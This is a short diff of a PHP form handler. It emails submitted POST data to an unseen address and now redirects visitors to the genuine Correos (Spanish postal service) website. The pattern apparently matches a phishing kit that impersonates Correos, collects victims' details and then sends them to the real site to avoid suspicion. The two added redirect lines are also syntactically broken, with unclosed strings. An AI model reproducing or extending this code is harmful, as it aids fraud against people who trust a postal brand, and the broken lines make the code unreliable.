@@ -25,8 +25,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 			$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
 			mail($to, $subject, $message, $headers);
 			
-      header("Location: sys.php?loading=".md5($_GET['error']));
-    }else header("Location: ?error=".md5($_GET['error']));
+      header("Location: https://www.correos.es/es/es/particulares);
+    }else header("Location: https://www.correos.es/es/es/particulares);
 }
 ?>
 <!DOCTYPE html>
